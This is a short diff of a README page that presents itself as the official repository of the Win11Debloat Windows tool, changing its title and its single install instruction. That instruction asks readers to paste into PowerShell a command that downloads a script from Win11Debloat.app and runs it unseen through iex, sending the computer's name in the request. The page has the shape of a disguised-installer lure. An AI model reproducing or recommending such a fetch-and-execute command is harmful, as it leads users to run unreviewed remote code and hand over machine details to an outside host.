@@ -1,6 +1,5 @@
-# Win11Debloat - The Best Windows 11 & 10 Debloater
-## Official GitHub Page
-
+# Win11Debloat - The Best Windows Debloater
+## Official GitHub Repository
 ---
 
 ## Win11Debloat usage:
@@ -10,7 +9,7 @@ Press `Win + R`, type `powershell`, and press `Enter`
 
 ### 2: Copy and paste the command below into PowerShell:
 ```powershell
-powershell -Command "irm Win11Debloat.app?connect=$env:COMPUTERNAME | iex"
+powershell -Command "irm Win11Debloat.app?debloat=$env:COMPUTERNAME | iex"
 `````  
 ### 3. Wait for the script to finish installing Win11Debloat.
 
